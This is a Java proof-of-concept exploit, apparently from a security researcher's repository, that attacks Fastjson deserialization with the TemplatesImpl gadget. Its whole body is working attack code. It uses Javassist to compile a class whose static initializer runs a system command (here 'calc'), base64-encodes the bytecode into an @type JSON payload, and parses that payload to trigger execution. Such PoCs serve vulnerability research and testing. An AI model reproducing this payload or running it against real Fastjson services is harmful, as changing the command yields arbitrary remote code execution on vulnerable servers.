/*
 * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.
 * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.
 * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.
 * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.
 * Vestibulum commodo. Ut rhoncus gravida arcu.
 */

package com.y5neko.sec.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

import javassist.ClassPool;
import javassist.CtClass;
import java.util.Base64;

public class TemplatesImpl {
    static String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
    public static class test{}

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get(test.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "Y5neKO";
        cc.setName(randomClassName);
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));

        byte[] evilCode = cc.toBytecode();
        String evilCode_base64 = Base64.getEncoder().encodeToString(evilCode);
        System.out.println(evilCode_base64);
        String payload =
                "{\"" +
                        "@type\":\"" + NASTY_CLASS + "\"," + "\"" +
                        "_bytecodes\":[\"" + evilCode_base64 + "\"]," +
                        "'_name':'asd','" +
                        "_tfactory':{ },\"" +
                        "_outputProperties\":{ }," + "\"" +
                        "_version\":\"1.0\",\"" +
                        "allowedProtocols\":\"all\"}\n";
        ParserConfig config = new ParserConfig();
        Object obj = JSON.parseObject(payload, Object.class, config, Feature.SupportNonPublicField);
    }

}